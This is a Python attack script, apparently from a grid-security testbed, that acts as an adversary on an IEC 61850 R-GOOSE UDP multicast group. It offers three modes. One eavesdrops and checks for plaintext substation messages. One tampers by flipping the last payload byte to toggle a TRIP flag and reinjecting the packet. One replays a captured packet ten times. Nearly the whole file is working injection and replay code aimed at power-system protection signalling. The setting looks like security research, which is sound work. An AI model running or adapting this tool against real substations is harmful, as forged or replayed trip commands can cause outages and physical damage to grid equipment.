#!/usr/bin/env python3
import time
import argparse
import socket
import struct
import json
import os
import fcntl

parser = argparse.ArgumentParser(description="R-GOOSE Adversary (UDP Multicast)")
parser.add_argument("--attack", type=str, choices=['eavesdrop', 'tamper', 'replay'], default='eavesdrop')
parser.add_argument("--iface", type=str, default="h3-eth0", help="Network interface to hack on")
args = parser.parse_args()

# --- R-GOOSE Configuration ---
MCAST_GRP = '239.0.0.1'
MCAST_PORT = 10102
TTL = 5

captured_udp_payloads = []
has_replayed = False  

LOG_FILE = "metrics/hacker_log.json"
os.makedirs("metrics", exist_ok=True)

with open(LOG_FILE, "w") as f:
    json.dump([], f)

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', bytes(ifname[:15], 'utf-8'))
        )[20:24])
    except OSError:
        print(f"[!] Error: Could not find IP for interface '{ifname}'. Check if interface exists.")
        os._exit(1)

def log_attack_step(step_title, detail, status="info"):
    try:
        with open(LOG_FILE, "r") as f: data = json.load(f)
    except: data = []
    data.append({"time": time.strftime("%H:%M:%S"), "title": step_title, "detail": detail, "status": status})
    with open(LOG_FILE, "w") as f: json.dump(data, f)

def start_hacker():
    global has_replayed
    
    print(f"[*] =======================================")
    print(f"[*] R-GOOSE HACKER TERMINAL ONLINE")
    print(f"[*] Interface: {args.iface} | Group: {MCAST_GRP}:{MCAST_PORT}")
    print(f"[*] Attack Mode: {args.attack.upper()}")
    print(f"[*] =======================================\n")
    
    local_ip = get_ip_address(args.iface)

    # 1. Setup Receiving Socket 
    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    recv_sock.bind(('', MCAST_PORT))
    mreq = struct.pack("4s4s", socket.inet_aton(MCAST_GRP), socket.inet_aton(local_ip))
    recv_sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

    # 2. Setup Sending Socket 
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, TTL)
    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(local_ip))

    while True:
        udp_payload, addr = recv_sock.recvfrom(4096)
        
        # Don't process our own injected traffic
        if addr[0] == local_ip or len(udp_payload) < 8: 
            continue

        timestamp = udp_payload[:8]
        secure_stream = udp_payload[8:]
        
        print(f"\n[!!!] INTERCEPTED R-GOOSE PACKET [!!!]")
        
        if args.attack == 'eavesdrop':
            stolen_text = secure_stream.decode('ascii', errors='ignore')
            if "SEL_421" in stolen_text or "LLN0" in stolen_text:
                print("    [!] Status: VULNERABLE. Plaintext structure detected.")
            else:
                print(f"    [?] Status: SECURE. Ciphertext: {secure_stream[:15].hex()}...")

        elif args.attack == 'tamper':
            if len(secure_stream) > 0:
                last_byte = secure_stream[-1:]
                if last_byte == b'\x00':
                    tampered_stream = secure_stream[:-1] + b'\x0f'
                    print("    [!] TAMPER: Flipped to TRIP=TRUE!")
                else:
                    tampered_stream = secure_stream[:-1] + b'\x00'
                    print("    [!] TAMPER: Flipped to TRIP=FALSE!")
                
                poisoned_payload = timestamp + tampered_stream
                time.sleep(0.005) 
                send_sock.sendto(poisoned_payload, (MCAST_GRP, MCAST_PORT))
                print(f"    [+] Surgical Poison injected into Multicast group!")

        elif args.attack == 'replay':
            captured_udp_payloads.append(udp_payload)
            print(f"    [>] REPLAY: Packet captured. Stored: {len(captured_udp_payloads)}")
            
            if len(captured_udp_payloads) == 10 and not has_replayed:
                print("    [+] Triggering 10x Replay Attack on UDP!")
                for i in range(10):
                    time.sleep(0.05) 
                    send_sock.sendto(captured_udp_payloads[4], (MCAST_GRP, MCAST_PORT))
                    print(f"    [+] Replay frame {i+1}/10 blasted!")
                has_replayed = True

if __name__ == "__main__":
    start_hacker()